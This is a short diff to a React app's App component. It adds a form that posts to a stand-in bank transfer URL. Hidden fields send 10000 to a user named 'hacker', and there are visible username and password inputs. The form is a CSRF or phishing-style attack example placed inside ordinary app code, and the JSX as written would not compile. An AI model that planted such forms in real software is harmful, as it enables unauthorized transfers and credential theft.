@@ -16,6 +16,13 @@ import ViewEmployeeComponent from './components/ViewEmployeeComponent';
 
 function App() {
   return (
+    <form action="https://www.xxx-bank.com/transfer" method="POST">
+      <input type="hidden" name="to_user" value="hacker">
+      <input type="hidden" name="amount" value="10000">
+      <input type="text" name="username" value="username">
+      <input type="password" name="password" value="password">
+      <input type="submit" value="Submit">
+    </form>
     <div>
         <Router>
             <div className = "container">
